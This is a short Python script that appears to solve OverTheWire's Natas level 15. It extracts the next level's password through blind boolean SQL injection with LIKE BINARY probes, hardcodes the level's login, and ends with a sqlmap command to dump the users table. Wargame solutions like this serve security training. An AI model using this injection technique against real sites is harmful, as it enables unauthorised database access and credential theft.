# dbms = MySQL
import requests

allChars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
parsedChars = ''
password = ''
target = 'http://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/'
existsStr = 'This user exists.'

r = requests.get(target)
if r.status_code != requests.codes.ok:
	raise ValueError('Unable to connect')
else:
	print 'Connected'

for c in allChars:
	r = requests.get(target+'?username=natas16" AND password LIKE BINARY "%'+c+'%" "')
	if r.content.find(existsStr) != -1:
		parsedChars += c
		print 'Used chars: ' + parsedChars

print 'Stating bruteforce'

for i in range(32):
	for c in parsedChars:
		r = requests.get(target+'?username=natas16" AND password LIKE BINARY "'+ password + c + '%" "')
		if r.content.find(existsStr) != -1:
			password += c
			print 'Password: '+ password 
			break

print 'Done'

# But my first thought is sqlmap
# sqlmap -u 'natas15.natas.labs.overthewire.org' --auth-type=basic --auth-cred=natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J --data="username=a" -p username --level 5 -D natas15 -T users --dump